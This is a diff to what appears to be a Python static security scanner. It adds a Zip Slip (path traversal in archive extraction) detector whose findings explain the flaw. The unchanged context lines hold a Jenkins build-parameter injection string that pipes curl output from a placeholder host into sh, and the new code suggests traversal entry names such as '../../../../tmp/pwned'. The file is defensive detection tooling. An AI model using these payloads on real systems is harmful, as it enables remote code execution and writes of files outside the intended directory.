@@ -25,6 +25,7 @@ from .xxe_guard import filter_guarded_xxe
 from .vendor_guard import is_vendor_file, NOISY_IN_VENDOR_FILES
 from .ast_engine import scan_ast, AST_SUPPORTED_LANGUAGES
 from .jenkins_pipeline_guard import find_jenkins_param_injection, GROOVY_LANGUAGES
+from .zipslip_guard import find_zip_slip, ZIP_LANGUAGES
 
 # No hand-written vulnerable application code is ever a single line this long —
 # only minified/bundled vendor files (tailwindcss.js, jquery.min.js, etc.) are,
@@ -436,6 +437,36 @@ def scan_lines(path: str, language: str, lines: List[str], patterns: list) -> Li
                 payload="Set the build parameter to something like `canary; curl http://you/x|sh #` (or your "
                         "payload's own closing/continuation syntax for this exact shell step) next time a "
                         "build is triggered.",
+                confidence="likely",
+            ))
+
+    # best-effort Zip Slip: a zip entry's own filename (from .infolist()/
+    # .filelist/.namelist()) is joined into a destination path via
+    # os.path.join(...) with no real containment check anywhere in the
+    # file (see zipslip_guard.py's module docstring — a bare ".." == or
+    # "in" substring test does NOT count as a real check, since the real
+    # motivating bug has exactly that test and still gets it wrong).
+    if language in ZIP_LANGUAGES:
+        for zf in find_zip_slip(path, language, lines):
+            key = (zf.line_no, "Path Traversal / Zip Slip")
+            if key in seen:
+                continue
+            seen.add(key)
+            findings.append(Finding(
+                file=zf.file,
+                line_no=zf.line_no,
+                line_text=zf.line_text,
+                vuln_name="Path Traversal / Zip Slip",
+                severity="high",
+                why="A zip archive entry's own filename (attacker-controlled: it's whatever the uploaded "
+                    "zip's entry headers say) is joined into a destination path for extraction. Without a "
+                    "real containment check (resolving the final path and confirming it's still inside the "
+                    "extraction directory), an entry named e.g. \"../../etc/cron.d/evil\" writes outside the "
+                    "intended folder — this is \"Zip Slip\", and a bare \"..\"-substring test is not enough: "
+                    "it has to actually reject the entry, not just compute an alternate path for it.",
+                payload="Craft a zip whose entry filename is a path-traversal string such as "
+                        "\"../../../../tmp/pwned\" (or an absolute path) so extraction writes outside the "
+                        "intended directory.",
                 confidence="likely",
             ))
 
